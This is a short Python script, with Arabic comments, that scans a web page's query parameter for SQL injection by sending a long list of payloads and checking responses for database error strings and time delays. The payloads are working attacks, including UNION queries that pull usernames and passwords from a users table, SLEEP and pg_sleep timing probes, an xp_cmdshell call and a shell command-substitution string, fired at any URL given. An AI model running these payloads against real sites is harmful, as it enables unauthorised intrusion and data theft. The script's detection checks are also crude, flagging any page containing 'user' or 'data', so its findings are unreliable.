import requests
import time

def scan_sql_injection(url, param="id"):
    """
    يقوم بفحص الموقع لاكتشاف ثغرات SQL Injection باستخدام طرق أكثر دقة.
    :param url: عنوان الموقع الذي تريد فحصه.
    :param param: اسم المعامل المراد حقنه (افتراضي: "id").
    """
    
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR '1'='1' #",
        "' OR '1'='1' /*",
        "' OR '1'='1' AND SLEEP(5) -- ",
        "' OR '1'='1' AND SLEEP(10) -- ",
        "\" OR \"1\"=\"1",
        "' UNION SELECT null, null, null -- ",
        "' UNION SELECT username, password FROM users -- ",
        "' AND 1=2 UNION SELECT 1, 'database', version() --",
        "' OR SLEEP(5)#",
        "' OR BENCHMARK(1000000,MD5(1))--",
        "' OR IF(1=1, SLEEP(5), 0)--",
        "' OR IF(1=1, SLEEP(10), 0)--",
        "\" OR 1=1 AND pg_sleep(5)--",
        "\" OR 1=1 AND pg_sleep(10)--",
        "' OR 'a'='a",  
        "' AND 1=2 UNION SELECT 1, table_name FROM information_schema.tables--",
        "' OR EXISTS(SELECT * FROM users)--",
        "'", "\"", "#", "--", "/*", 
        "'%20--", "--';", "'%20;", "=%20'", "=%20;", "=%20--", 
        "' or 1=1 --", "\" or 1=1 --", "' or 'a'='a",
        "' or 'x'='x", "\" or \"x\"=\"x", "') or ('x'='x", 
        "' or 1=1 or ''='", "\" or 1=1 or \"\"=\"", "0 or 1=1",
        "or 0=0 --", "' or 0=0 #", "' or a=a--", 
        "' or username like '%", "' or user like '%",
        "admin'--", "PRINT", "select", "insert", "as", 
        "limit", "order by", "asc", "desc", 
        "delete", "update", "distinct", "having", "truncate", 
        "replace", "like", "handler", "bfilename",
        "'; exec master..xp_cmdshell", "1;SELECT%20*",
        "tz_offset", "%20$(sleep%2050)"
    ]

    error_messages = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "syntax error",
        "ORA-00933",  
        "SQLiteException",  
        "mysql_fetch_assoc",  
        "mysql_num_rows",  
        "pg_fetch_result",  
        "syntax error at or near",
        "invalid input syntax for type",
        "unterminated quoted string",
        "syntax error in query expression",
        "incorrect syntax near",
        "unexpected end of SQL command",
        "division by zero",
        "SQL command not properly ended",
        "column not allowed here",
        "invalid character",
        "unrecognized token"
    ]

    stability_checks = 3

    for payload in payloads:
        target_url = f"{url}?{param}={payload}"
        try:
            print(f"[*] تجربة الحمولة: {payload}")
            timing_detections = 0

            for _ in range(stability_checks):  
                start_time = time.time()
                response = requests.get(target_url)
                response_time = time.time() - start_time

                
                for error in error_messages:
                    if error.lower() in response.text.lower():
                        print(f"[+] تم اكتشاف ثغرة SQL Injection عند: {target_url} مع رسالة الخطأ: {error}")
                        return True  # اكتشاف الثغرة وإرجاع True

                
                if "sleep" in payload and response_time > 4:
                    timing_detections += 1

                
                if "data" in response.text.lower() or "user" in response.text.lower() or "query result" in response.text.lower():
                    print(f"[+] تم اكتشاف تسرب محتمل للبيانات عند: {target_url}")
                    return True  # اكتشاف التسرب وإرجاع True

            
            if timing_detections >= (stability_checks // 2):
                print(f"[+] تم اكتشاف ثغرة SQL Injection تستند إلى الوقت عند: {target_url}")
                return True  

            print(f"[-] لم يتم اكتشاف ثغرة SQL Injection عند: {target_url}")

        except requests.exceptions.RequestException as e:
            print(f"[!] خطأ أثناء الاتصال بـ {target_url}: {e}")

    return False  
